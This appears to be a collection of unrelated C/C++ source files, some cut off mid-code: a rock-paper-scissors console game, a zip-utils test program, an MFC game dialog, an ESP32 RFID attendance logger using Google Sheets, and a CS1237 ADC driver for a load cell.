    "// Online C++ compiler to run C++ program online\n#include <iostream>\n#include <cstdlib>\n#include <ctime>\n\n#define ROCK 1\n#define PAPER 2\n#define SCISSORS 3\n\nusing namespace std;\nint main()\n{\n    srand((unsigned int) time(NULL));\n    \n    int player_throw = 0;\n    int ai_throw = 0;\n    bool draw = false;\n    \n    do\n    {\n        cout << \"Select your throw.\" << endl;\n        cout << \"1) Rock\" << endl;\n        cout << \"2) Paper\" << endl;\n        cout << \"3) Scissors\" << endl;\n        cout << \"selection:\";\n        cin >> player_throw;\n        \n        cout << endl;\n        \n        ai_throw = (rand() % 3) +1;\n        if (ai_throw == ROCK)\n        {\n            cout << \"AI throws ROCK.\" << endl;\n        }\n        else if (ai_throw == PAPER)\n        {\n            cout << \"AI throws == PAPER.\" << endl;\n        }\n        else if (ai_throw == SCISSORS)\n        {\n            cout << \"AI throws SCISSORS.\" <<endl;\n        }\n        draw = false;\n        if (player_throw == ai_throw)\n        {\n            draw = true;\n            cout << \"Draw! Play again!\" << endl;\n        }\n        else if (player_throw == ROCK && ai_throw == SCISSORS)\n        {\n            cout << \"ROCK beats SCISSORS! YOU WIN.\" << endl;\n        }\n        else if (player_throw == ROCK && ai_throw == PAPER)\n        {\n            cout << \" PAPER beats ROCK! YOU LOSE.\" << endl;\n        }\n        else if (player_throw == PAPER && ai_throw == ROCK)\n        {\n            cout << \"PAPER beats ROCK! YOU WIN.\" << endl;\n        }\n        else if (player_throw == PAPER && ai_throw == SCISSORS)\n        {\n            cout << \"SCISSORS beats PAPER! YOU LOSE.\" <<endl;\n        }\n        else if (player_throw == SCISSORS && ai_throw == PAPER)\n        {\n            cout <<  \"SCISSORS beats PAPER! YOU WIN.\" << endl;\n        }\n        else if (player_throw == SCISSORS && ai_throw == ROCK)\n        {\n            cout << \"ROCK beats SCISSORS! YOU LOSE.\" << endl;\n        }\n        \n        cout << endl;\n        \n    \n  // rack beats scissor\n  // scissors beats paper\n  // paper beats rock\n  } while (draw);\n\n    return 0;\n}\n",
    "#include <windows.h>\n#include <tchar.h>\n#include <stdio.h>\n#include \"../../zip.h\"\n#include \"../../unzip.h\"\n\n// This program runs a bunch of test cases on zip/unzip.\n// Most of the test cases come from bugs that had been reported\n// in an earlier version of the ziputils, to be sure that they're fixed.\n\n\n\nbool tsame(const FILETIME t0, const FILETIME t1)\n{ if (t0.dwHighDateTime!=t1.dwHighDateTime) return false;\n  if ( (t0.dwLowDateTime>>28) != (t1.dwLowDateTime>>28)) return false;\n  return true;\n  // we allow some flexibility in the lower bits. That's because zip's don't store times with as much precision.\n}\n\nbool fsame(const TCHAR *fn0, const TCHAR *fn1)\n{ HANDLE hf0=CreateFile(fn0,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);\n  HANDLE hf1=CreateFile(fn1,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);\n  if (hf0==INVALID_HANDLE_VALUE || hf1==INVALID_HANDLE_VALUE)\n  { if (hf0!=INVALID_HANDLE_VALUE) CloseHandle(hf0);\n    if (hf1!=INVALID_HANDLE_VALUE) CloseHandle(hf1);\n    return false;\n  }\n  DWORD size0=GetFileSize(hf0,0), size1=GetFileSize(hf1,0);\n  if (size0!=size1) {CloseHandle(hf0); CloseHandle(hf1); return false;}\n  DWORD size=size0;\n  //\n  char *buf[2]; buf[0]=new char[16384]; buf[1]=new char[16384];\n  DWORD done=0;\n  while (done<size)\n  { DWORD left=size-done; if (left>16384) left=16384;\n    DWORD red; ReadFile(hf0,buf[0],left,&red,0); ReadFile(hf1,buf[1],left,&red,0);\n    if (memcmp(buf[0],buf[1],left)!=0) break;\n    done+=left;\n  }\n  delete[] buf[0]; delete[] buf[1];\n  CloseHandle(hf0); CloseHandle(hf1);\n  return (done==size);\n}\n\nvoid SaveResource(const TCHAR *res, const TCHAR *fn)\n{ HINSTANCE hInstance = GetModuleHandle(0);\n  HRSRC hrsrc=FindResource(hInstance,res,RT_RCDATA);\n  HANDLE hglob = LoadResource(hInstance,hrsrc);\n  void *buf=LockResource(hglob);\n  unsigned int len=SizeofResource(hInstance,hrsrc);\n  HANDLE hf = CreateFile(fn,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);\n  DWORD writ; WriteFile(hf,buf,len,&writ,0);\n  CloseHandle(hf);\n}\n\nbool any_errors=false; bool p_abort=false;\nvoid msg(const TCHAR *s)\n{ if (s[0]=='*') any_errors=true;\n#ifdef UNDER_CE\n  int res=IDOK;\n  if (s[0]=='*') res=MessageBox(0,s,_T(\"Zip error\"), MB_ICONERROR|MB_OKCANCEL);\n  else if (s[0]=='.') MessageBeep(0);\n  else MessageBox(0,s,_T(\"Zip test\"),MB_OKCANCEL);\n  if (res==IDCANCEL) p_abort=true;\n#else\n  _tprintf(_T(\"%s\\n\"),s);\n#endif\n}\n\n\nvoid main()\n{ HZIP hz; HANDLE hf; DWORD writ; ZRESULT zr; ZIPENTRY ze; TCHAR m[1024];\n  bool fast=false;\n#ifdef UNDER_CE\n  fast=true;\n#endif\n#ifdef __CODEGUARD__\n  fast=true;\n#endif\n  \n\n  msg(_T(\"Zip-utils tests. Files will be left in \\\"\\\\z\\\"\"));\n  CreateDirectory(_T(\"\\\\z\"),0);\n  SaveResource(MAKEINTRESOURCE(1),_T(\"\\\\z\\\\extra.zip\"));\n  SaveResource(MAKEINTRESOURCE(2),_T(\"\\\\z\\\\ce2ce.jpg\"));\n  SaveResource(MAKEINTRESOURCE(3),_T(\"\\\\z\\\\ce2ce.txt\"));\n\n\n  \n\n  // fixed bug: OpenZip errors and returns0 when you try to open a zip with no files in it\n  msg(_T(\"empty - testing whether it fails to open empty zipfiles\"));\n  hz=CreateZip(_T(\"\\\\z\\\\empty.zip\"),0); if (hz==0) msg(_T(\"* Failed to create empty.zip\"));\n  zr=CloseZip(hz); if (zr!=ZR_OK) msg(_T(\"* Failed to close empty.zip\"));\n  if (p_abort) return;\n  hz=OpenZip(_T(\"\\\\z\\\\empty.zip\"),0); if (hz==0) msg(_T(\"* Failed to open empty.zip\"));\n  zr=GetZipItem(hz,-1,&ze); if (zr!=ZR_OK) msg(_T(\"* Failed to get empty.zip index\"));\n  zr=CloseZip(hz); if (zr!=ZR_OK) msg(_T(\"* Failed to close empty.zip\"));\n  if (p_abort) return;\n\n  // fixed bug: IsZipHandle should return false for a NULL handle.\n  msg(_T(\"IsZipHandle - testing whether 0 is considered a handle\"));\n  bool b = IsZipHandleZ(0) || IsZipHandleU(0);\n  if (b) msg(_T(\"IsZipHandle failed to deny handlehood of NULL\"));\n  if (p_abort) return;\n  \n  // fixed bug: if one file is bigger then the following must be smaller than 64k -- diff. between release and debug mode\n  // fixed bug: test0=71k, test1=152.2k, test2=145b, test3=120k, here test3 returns ZR_WRITE\n  msg(_T(\"sizes - testing whether large-then-small files work okay\"));\n  { char *c=new char[200*1024]; for (int i=0; i<200*1024; i++) c[i]=(char)(rand()%255);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-71k.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,71*1024,&writ,0); CloseHandle(hf);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-152_2k.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,152*1024+1024/5,&writ,0); CloseHandle(hf);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-145b.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,145,&writ,0); CloseHandle(hf);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-120k.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,120*1024,&writ,0); CloseHandle(hf);\n    delete[] c;\n  }\n  //\n  hz=CreateZip(_T(\"\\\\z\\\\sizes.zip\"),0); if (hz==0) msg(_T(\"* Failed to create sizes.zip\"));\n  zr=ZipAdd(hz,_T(\"sizes-71k.out.dat\"),_T(\"\\\\z\\\\sizes-71k.dat\")); if (zr!=ZR_OK) msg(_T(\"* Failed to add 71k\"));\n  zr=ZipAdd(hz,_T(\"sizes-152_2k.out.dat\")",
    "\ufeff\n// LLKDlg.cpp: \u5b9e\u73b0\u6587\u4ef6\n//\n\n#include \"pch.h\"\n#include \"framework.h\"\n#include \"LLK.h\"\n#include \"LLKDlg.h\"\n#include \"afxdialogex.h\"\n#include \"CGameDlg.h\"\n#include \"Resource.h\"\n#include <Windows.h>\n#include <iostream>\n#include \"string.h\"\n#include <process.h> \n#include<iomanip>\n#include <MMSystem.h>\n#pragma comment (lib,\"Winmm.lib\");\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#endif\n\n\n// \u7528\u4e8e\u5e94\u7528\u7a0b\u5e8f\u201c\u5173\u4e8e\u201d\u83dc\u5355\u9879\u7684 CAboutDlg \u5bf9\u8bdd\u6846\n\nclass CAboutDlg : public CDialogEx\n{\npublic:\n\tCAboutDlg();\n\n// \u5bf9\u8bdd\u6846\u6570\u636e\n#ifdef AFX_DESIGN_TIME\n\tenum { IDD = IDD_ABOUTBOX };\n#endif\n\n\tprotected:\n\tvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV \u652f\u6301\n\n// \u5b9e\u73b0\nprotected:\n\tDECLARE_MESSAGE_MAP()\n};\n\nCAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)\n{\n}\n\nvoid CAboutDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialogEx::DoDataExchange(pDX);\n}\n\nBEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)\nEND_MESSAGE_MAP()\n\n\n// CLLKDlg \u5bf9\u8bdd\u6846\n\n\n\nCLLKDlg::CLLKDlg(CWnd* pParent /*=nullptr*/)\n\t: CDialogEx(IDD_LLK_DIALOG, pParent)\n{\n\tm_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);\n}\n\nvoid CLLKDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialogEx::DoDataExchange(pDX);\n}\n\nvoid CLLKDlg::InitBackground(void)\n{\n\tCBitmap bmpMain;\n\tbmpMain.LoadBitmapW(IDB_BITMAP1);\n\tCClientDC dc(this);\n\tm_dcMem.CreateCompatibleDC(&dc);\n\tm_dcMem.SelectObject(bmpMain);\n\tCRect rtWin;\n\tCRect rtClient;\n\tthis->GetWindowRect(rtWin); // \u83b7\u5f97\u7a97\u53e3\u5927\u5c0f\n\tthis->GetClientRect(rtClient); // \u83b7\u5f97\u5ba2\u6237\u533a\u5927\u5c0f\n\t// \u6807\u9898\u680f\u548c\u5916\u8fb9\u6846\u7684\u5927\u5c0f\n\tint nSpanWidth = rtWin.Width() - rtClient.Width();\n\tint nSpanHeight = rtWin.Height() - rtClient.Height();\n\t// \u8bbe\u7f6e\u7a97\u53e3\u5927\u5c0f\n\tMoveWindow(0, 0, 1200 + nSpanWidth, 900 + nSpanHeight);\n\tCenterWindow();\n}\n\nBEGIN_MESSAGE_MAP(CLLKDlg, CDialogEx)\n\tON_WM_SYSCOMMAND()\n\tON_WM_PAINT()\n\tON_WM_QUERYDRAGICON()\n\tON_BN_CLICKED(IDC_BTN_BASIC, &CLLKDlg::OnClickedBtnBasic)\n\tON_BN_CLICKED(IDC_BUTTON1, &CLLKDlg::OnBnClickedButton1)\n\tON_BN_CLICKED(IDC_BUTTON2, &CLLKDlg::OnBnClickedButton2)\nEND_MESSAGE_MAP()\n\n\n// CLLKDlg \u6d88\u606f\u5904\u7406\u7a0b\u5e8f\n\nBOOL CLLKDlg::OnInitDialog()\n{\n\tCDialogEx::OnInitDialog();\n\tPlaySound((LPCTSTR)IDR_WAVE1, AfxGetInstanceHandle(), SND_RESOURCE | SND_ASYNC | SND_LOOP);\n\t// \u5c06\u201c\u5173\u4e8e...\u201d\u83dc\u5355\u9879\u6dfb\u52a0\u5230\u7cfb\u7edf\u83dc\u5355\u4e2d\u3002\n\n\t// IDM_ABOUTBOX \u5fc5\u987b\u5728\u7cfb\u7edf\u547d\u4ee4\u8303\u56f4\u5185\u3002\n\tASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);\n\tASSERT(IDM_ABOUTBOX < 0xF000);\n\n\tCMenu* pSysMenu = GetSystemMenu(FALSE);\n\tif (pSysMenu != nullptr)\n\t{\n\t\tBOOL bNameValid;\n\t\tCString strAboutMenu;\n\t\tbNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);\n\t\tASSERT(bNameValid);\n\t\tif (!strAboutMenu.IsEmpty())\n\t\t{\n\t\t\tpSysMenu->AppendMenu(MF_SEPARATOR);\n\t\t\tpSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);\n\t\t}\n\t}\n\n\t// \u8bbe\u7f6e\u6b64\u5bf9\u8bdd\u6846\u7684\u56fe\u6807\u3002  \u5f53\u5e94\u7528\u7a0b\u5e8f\u4e3b\u7a97\u53e3\u4e0d\u662f\u5bf9\u8bdd\u6846\u65f6\uff0c\u6846\u67b6\u5c06\u81ea\u52a8\n\t//  \u6267\u884c\u6b64\u64cd\u4f5c\n\tSetIcon(m_hIcon, TRUE);\t\t\t// \u8bbe\u7f6e\u5927\u56fe\u6807\n\tSetIcon(m_hIcon, FALSE);\t\t// \u8bbe\u7f6e\u5c0f\u56fe\u6807\n\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u989d\u5916\u7684\u521d\u59cb\u5316\u4ee3\u7801\n\tInitBackground();\n\treturn TRUE;  // \u9664\u975e\u5c06\u7126\u70b9\u8bbe\u7f6e\u5230\u63a7\u4ef6\uff0c\u5426\u5219\u8fd4\u56de TRUE\n}\n\nvoid CLLKDlg::OnSysCommand(UINT nID, LPARAM lParam)\n{\n\tif ((nID & 0xFFF0) == IDM_ABOUTBOX)\n\t{\n\t\tCAboutDlg dlgAbout;\n\t\tdlgAbout.DoModal();\n\t}\n\telse\n\t{\n\t\tCDialogEx::OnSysCommand(nID, lParam);\n\t}\n}\n\n// \u5982\u679c\u5411\u5bf9\u8bdd\u6846\u6dfb\u52a0\u6700\u5c0f\u5316\u6309\u94ae\uff0c\u5219\u9700\u8981\u4e0b\u9762\u7684\u4ee3\u7801\n//  \u6765\u7ed8\u5236\u8be5\u56fe\u6807\u3002  \u5bf9\u4e8e\u4f7f\u7528\u6587\u6863/\u89c6\u56fe\u6a21\u578b\u7684 MFC \u5e94\u7528\u7a0b\u5e8f\uff0c\n//  \u8fd9\u5c06\u7531\u6846\u67b6\u81ea\u52a8\u5b8c\u6210\u3002\n\nvoid CLLKDlg::OnPaint()\n{\n\tif (IsIconic())\n\t{\n\t\tCPaintDC dc(this); // \u7528\u4e8e\u7ed8\u5236\u7684\u8bbe\u5907\u4e0a\u4e0b\u6587\n\n\t\tSendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);\n\n\t\t// \u4f7f\u56fe\u6807\u5728\u5de5\u4f5c\u533a\u77e9\u5f62\u4e2d\u5c45\u4e2d\n\t\tint cxIcon = GetSystemMetrics(SM_CXICON);\n\t\tint cyIcon = GetSystemMetrics(SM_CYICON);\n\t\tCRect rect;\n\t\tGetClientRect(&rect);\n\t\tint x = (rect.Width() - cxIcon + 1) / 2;\n\t\tint y = (rect.Height() - cyIcon + 1) / 2;\n\n\t\t// \u7ed8\u5236\u56fe\u6807\n\t\tdc.DrawIcon(x, y, m_hIcon);\n\t}\n\telse\n\t{\n\t\tCPaintDC dc(this);\n\t\tdc.BitBlt(0, 0, 1250, 900, &m_dcMem, 0, 0, SRCCOPY);\n\t\tCDialogEx::OnPaint();\n\t}\n}\n\n//\u5f53\u7528\u6237\u62d6\u52a8\u6700\u5c0f\u5316\u7a97\u53e3\u65f6\u7cfb\u7edf\u8c03\u7528\u6b64\u51fd\u6570\u53d6\u5f97\u5149\u6807\n//\u663e\u793a\u3002\nHCURSOR CLLKDlg::OnQueryDragIcon()\n{\n\treturn static_cast<HCURSOR>(m_hIcon);\n}\n\nvoid CLLKDlg::OnClickedBtnBasic()\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u63a7\u4ef6\u901a\u77e5\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\n\tCGameDlg dlg;\n\tShowWindow(SW_HIDE);\n\tdlg.DoModal();\n\tShowWindow(SW_SHOW);\n}\n\n\nvoid CLLKDlg::OnBnClickedButton1()\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u63a7\u4ef6\u901a\u77e5\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\n\tMessageBox(_T(\"\u656c\u8bf7\u671f\u5f85!\"));\n}\n\n\nvoid CLLKDlg::OnBnClickedButton2()\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u63a7\u4ef6\u901a\u77e5\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\n\tMessageBox(_T(\"\u656c\u8bf7\u671f\u5f85!\"));\n}\n",
    "// Projecto de registro de asistencia usando ESP32 + RFID MFRC522 + Google Spreadsheet\n// Toma como base el ejemplo de la librer\u00eda ESP Google Sheet Client\n// https://github.com/mobizt/ESP-Google-Sheet-Client/tree/master/examples/Values/Create_Update_Read\n\n#include <Arduino.h>\n#include <WiFi.h>\n#include <ESP_Google_Sheet_Client.h>\n#include \"time.h\"\n#include <SPI.h>\n#include <MFRC522.h>\n#include <Wire.h> \n#include <LiquidCrystal_I2C.h>\n\n// Auxiliar para montaje de la SD\n#include <GS_SDHelper.h>\n\n// Credenciales para la conexi\u00f3n WIFI\n#define WIFI_SSID \"SSID\"\n#define WIFI_PASSWORD \"PASSWORD\"\n\n// Credenciales para la conexi\u00f3n al servicio de Google\n#define PROJECT_ID \"NOMBRE_PROYECTO\"\n#define CLIENT_EMAIL \"CLIENTE DE CORREO COMPARTIDO\"\n#define USER_EMAIL \"CORREO DEL USUARIO\"\nconst char PRIVATE_KEY[] PROGMEM = \"-----BEGIN PRIVATE KEY----- clave privada -----END PRIVATE KEY-----\\n\";\nconst char SPREADSHEETID[] = \"PARTE DE LA URL QUE IDENTIFICA UNIVOCAMENTE A ESA PLANILLA DE C\u00c1LCULO\";\n\n// RFID - MFRC522\n\n// Conexi\u00f3n (para ESP32) usando SPI\n// SS/SDA -> D5\n// SCK    -> D18\n// MOSI   -> D23\n// MISO   -> D19\n// GND    -> GND\n// VCC    -> 3.3V\n// RST    -> D0\nconst int RST_PIN = 0;\nconst int SS_PIN = 5;\n\n// Instancia del lector RFID\nMFRC522 rfid(SS_PIN, RST_PIN); \n\nMFRC522::MIFARE_Key key; \n\n// Display LCD 16x2\n\n// Conexi\u00f3n para ESP32\n// SDA    -> D21\n// SCL    -> D22\n// GND    -> GND\n// VCC    -> 5v\nLiquidCrystal_I2C lcd(0x27, 16, 2);\n\n// LEDs de se\u00f1alizaci\u00f3n\nconst int LED_ROJO_ERROR = 25;\nconst int LED_VERDE_OK   = 26;\nconst int LED_AMARILLO_EN_PROCESO = 27;\nconst int LED_AZUL_POWER = 33;\n\n\n// Servidor de Fecha + Hora\nconst char* ntpServer = \"pool.ntp.org\";\n// Diferencia horaria en segundos para el timezone de R\u00edo Gallegos, Argentina\nconst long  gmtOffset_sec = -10800;\n\n// Funci\u00f3n auxiliar para el token de conexi\u00f3n con Google\nvoid tokenStatusCallback(TokenInfo info);\n\n// Funci\u00f3n auxiliar para mostrar mensajes en el LCD\nvoid mostrar_mensajes(String linea1, String linea2){\n  lcd.clear();\n  lcd.setCursor(0, 0);\n  lcd.print(linea1);\n  lcd.setCursor(0, 1);\n  lcd.print(linea2);\n\n}\n\n// Array auxiliar para ilustrar el avance de la conexi\u00f3n al WiFi\nchar espera[] = { '-', '\\\\', '|', '/' };\n\n\nvoid setup()\n{\n\n    Serial.begin(115200);\n    Serial.println();\n    Serial.println();\n\n    // LEDs indicadores\n    pinMode(LED_ROJO_ERROR, OUTPUT);\n    pinMode(LED_VERDE_OK, OUTPUT);\n    pinMode(LED_AMARILLO_EN_PROCESO, OUTPUT);\n    pinMode(LED_AZUL_POWER, OUTPUT);\n\n    // LED ROJO encendido\n    digitalWrite(LED_ROJO_ERROR, HIGH);\n    digitalWrite(LED_AZUL_POWER, LOW);\n    digitalWrite(LED_AMARILLO_EN_PROCESO, LOW);\n    digitalWrite(LED_VERDE_OK, LOW);\n\n    // RFID\n    SPI.begin();\n    rfid.PCD_Init();\n\n    // LCD\n    lcd.init(); \n    lcd.backlight();\n    lcd.setCursor(1, 0);\n    lcd.print(\"Control Asistencia\");\n\n\n    // Configuraci\u00f3n de la zona horaria para el servidor NTP\n    configTime(gmtOffset_sec, 0, ntpServer);\n\n    GSheet.printf(\"ESP Google Sheet Client v%s\\n\\n\", ESP_GOOGLE_SHEET_CLIENT_VERSION);\n    \n\n    #if defined(ESP32) || defined(ESP8266)\n        WiFi.setAutoReconnect(true);\n    #endif\n\n    WiFi.begin(WIFI_SSID, WIFI_PASSWORD);\n\n    unsigned long ms = millis();\n    int avance = 0;\n    while (WiFi.status() != WL_CONNECTED)\n    {\n      avance ++;\n      mostrar_mensajes(\"Conectando WiFi...\", String(espera[avance % 4]));\n      delay(300);\n    }\n\n    // Una vez conectado, apago LED_ROJO y enciendo LED_AZUL\n    digitalWrite(LED_ROJO_ERROR, LOW);\n    digitalWrite(LED_AZUL_POWER, HIGH);\n\n    mostrar_mensajes(\"Connectado IP: \", String(WiFi.localIP()));\n\n    // Seteo de par\u00e1metros de la librer\u00eda Google Sheet \n    // Establecer callBack para el estado de generaci\u00f3n del token de acceso a la API de Google (s\u00f3lo para depuraci\u00f3n)\n    GSheet.setTokenCallback(tokenStatusCallback);\n    // Establezca los segundos para actualizar el token de autenticaci\u00f3n antes de que caduque (de 60 a 3540, por defecto 300 segundos).\n    GSheet.setPrerefreshSeconds(10 * 60);\n    // Iniciar la generaci\u00f3n del token de acceso para la autenticaci\u00f3n de Google API\n    GSheet.begin(CLIENT_EMAIL, PROJECT_ID, PRIVATE_KEY);\n\n\n}\n\nvoid loop()\n{\n\n  // Detecto si hay una nueva tarjeta presente\n  if (rfid.PICC_IsNewCardPresent()){\n    // Si la puedo leer\n    if (rfid.PICC_ReadCardSerial()){\n\n        MFRC522::StatusCode status;\n        byte blockAddr = 4;\n        String strNombre;\n\n        // Enciendo LED_AMARILLO para indicar que esta en proceso\n        digitalWrite(LED_AMARILLO_EN_PROCESO, HIGH);\n\n        // Llamar a ready() repetidamente en bucle para comprobar y procesar la autenticaci\u00f3n\n        bool ready = GSheet.ready();\n\n        if (ready)\n        {\n\n            FirebaseJson response;\n            FirebaseJson valueRange;\n\n            // Leer el ID\n            String strUID = String(rfid.uid.uidByte[0], HEX) + \" \" + String(rfid.uid.uidByte[1], HEX) + \" \" + String(rfid.uid.uidByte[2], HEX) + \" \" + String(rfid.uid.uidByte[3], HEX);\n            // Obtener d\u00eda y hora\n         ",
    "#include <Arduino.h>\r\n#include <fmt/format.h>\r\n\r\n#define SCK 4\r\n#define DOUT 5\r\n#define SCLK_LOW digitalWrite(SCK, 0)\r\n#define SCLK_HIGH digitalWrite(SCK, 1)\r\n\r\nenum REG_MODS {\r\n  CH_SEL_A = 0b00,\r\n  CH_SEL_B = 0b01,\r\n  CH_SEL_CHIP_RETENTION = 0b01,\r\n  CH_SEL_TEMPERATURE = 0b10,\r\n  CH_SEL_INTERNAL_SHORT = 0b11,\r\n  PGA_SEL_1 = 0b00 << 2,\r\n  PGA_SEL_2 = 0b01 << 2,\r\n  PGA_SEL_64 = 0b10 << 2,\r\n  PGA_SEL_128 = 0b11 << 2,\r\n  SPEED_SEL_10 = 0b00 << 4,\r\n  SPEED_SEL_40 = 0b01 << 4,\r\n  SPEED_SEL_640 = 0b10 << 4,\r\n  SPEED_SEL_1280 = 0b11 << 4,\r\n  REF_ON = 0b0 << 6,\r\n  REF_OFF = 0b1 << 6\r\n};\r\n\r\nvoid CS1237Init()\r\n{\r\n\tpinMode(SCK, OUTPUT);\r\n\tpinMode(DOUT, INPUT_PULLUP);\r\n  delayMicroseconds(10);\r\n\tSCLK_LOW;\r\n}\r\n\r\nint CS1237isReady()\r\n{\r\n\treturn !digitalRead(DOUT);\r\n}\r\n\r\nvoid CS1237ClockUp()\r\n{\r\n\tSCLK_HIGH;\r\n\tdelayMicroseconds(10);\r\n\tSCLK_LOW;\r\n\tdelayMicroseconds(10);\r\n}\r\n\r\nvoid CS1237WriteConfig()\r\n{\r\n\t//no op\r\n\r\n  //pinMode(DOUT, OUTPUT);\r\n\r\n  while (!CS1237isReady());\r\n\r\n  // 1.\r\n  // Blank for 24 clock cycles, part of the spec\r\n  for (int i = 0; i < 24; i++)\r\n    CS1237ClockUp();\r\n\r\n  // 2.\r\n  // Skip the two register status reads, don't care yet\r\n  CS1237ClockUp();\r\n  CS1237ClockUp();\r\n\r\n  // 3.\r\n  // 27th SCLK pulls the /DRDY / DOUT high\r\n  CS1237ClockUp();\r\n\r\n  // 4.\r\n  // Between clock 28 and 29 switch DOUT to an output\r\n  CS1237ClockUp();\r\n  pinMode(DOUT, OUTPUT);\r\n  CS1237ClockUp();\r\n\r\n  // 5.\r\n  // Read 7 bits on input word to determine read or write\r\n  char writeReg = 0x65 << 1;\r\n  for (int i = 0; i < 7; i++)\r\n  {\r\n    digitalWrite(DOUT, 0x80 & writeReg);\r\n    writeReg <<= 1;\r\n    CS1237ClockUp();\r\n    SCLK_LOW;\r\n  }\r\n\r\n  // 6.\r\n  // Spare clock since we only write for now\r\n  CS1237ClockUp();\r\n\r\n  char settings = (CH_SEL_TEMPERATURE | PGA_SEL_128 | SPEED_SEL_1280 | REF_OFF);\r\n  for (int i = 0; i < 8; i++)\r\n  {\r\n    digitalWrite(DOUT, 0x80 & settings);\r\n    settings <<= 1;\r\n    CS1237ClockUp();\r\n  }\r\n\r\n  digitalWrite(DOUT, 0);\r\n\r\n\tSCLK_LOW;\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tSCLK_LOW;\r\n\r\n  pinMode(DOUT, INPUT_PULLUP);\r\n}\r\n\r\nint CS1237ReadConfig()\r\n{\r\n  while (!CS1237isReady());\r\n\r\n  // 1.\r\n  // Blank for 24 clock cycles, part of the spec\r\n  for (int i = 0; i < 24; i++)\r\n    CS1237ClockUp();\r\n\r\n  // 2.\r\n  // Skip the two register status reads, don't care yet\r\n  CS1237ClockUp();\r\n  CS1237ClockUp();\r\n\r\n  // 3.\r\n  // 27th SCLK pulls the /DRDY / DOUT high\r\n  CS1237ClockUp();\r\n\r\n  // 4.\r\n  // Between clock 28 and 29 switch DOUT to an output\r\n  CS1237ClockUp();\r\n  pinMode(DOUT, OUTPUT);\r\n  CS1237ClockUp();\r\n\r\n  // 5.\r\n  // Read 7 bits on input word to determine read or write\r\n  char writeReg = 0x56 << 1;\r\n  for (int i = 0; i < 7; i++)\r\n  {\r\n    digitalWrite(DOUT, 0x80 & writeReg);\r\n    writeReg <<= 1;\r\n    CS1237ClockUp();\r\n    SCLK_LOW;\r\n  }\r\n\r\n  // 6.\r\n  //\r\n  CS1237ClockUp();\r\n  pinMode(DOUT, INPUT_PULLUP);\r\n\r\n  char settings = 0;\r\n  for (int i = 0; i < 8; i++)\r\n  {\r\n    CS1237ClockUp();\r\n    settings = (settings << 1) | digitalRead(DOUT);\r\n    SCLK_LOW;\r\n  }\r\n\r\n\tSCLK_LOW;\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tSCLK_LOW;\r\n\r\n  return settings;\r\n}\r\n\r\nint CS1237Read()\r\n{\r\n\tint tmp = 0;\r\n\r\n\twhile (!CS1237isReady());\r\n\r\n\tfor (int i = 0; i < 24; i++)\r\n\t{\r\n    CS1237ClockUp();\r\n\t\ttmp = (tmp << 1) | digitalRead(DOUT);\r\n\t\tSCLK_LOW;\r\n\t}\r\n\r\n\tSCLK_LOW;\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tSCLK_LOW;\r\n\r\n\treturn tmp;\r\n}\r\n\r\nlong getValue(int num)\r\n{\r\n\tlong weight = 0;\r\n\tfor(int i = 0; i < num; i++)\r\n\t{\r\n\t\tweight += CS1237Read();;\r\n\t}\r\n\treturn weight / num;\r\n}\r\n\r\nlong offset = 0;\r\n\r\nvoid tare()\r\n{\r\n  Serial.print(\"Interupt Triggered\");\r\n  offset = getValue(640);\r\n}\r\n\r\nvoid setup() {\r\n  Serial.begin(115200);\r\n  pinMode(24, INPUT_PULLUP);\r\n  //attachInterrupt(digitalPinToInterrupt(24), tare, CHANGE);\r\n  delayMicroseconds(10);\r\n  CS1237Init();\r\n  CS1237WriteConfig();\r\n}\r\n\r\nvoid loop() {\r\n  if (!digitalRead(24))\r\n    offset = getValue(128);\r\n\r\n  Serial.print(fmt::format(\"Attempting: {:>10} {:>10}\", CS1237Read() - offset, offset).c_str());\r\n  Serial.println();\r\n}\r\n",
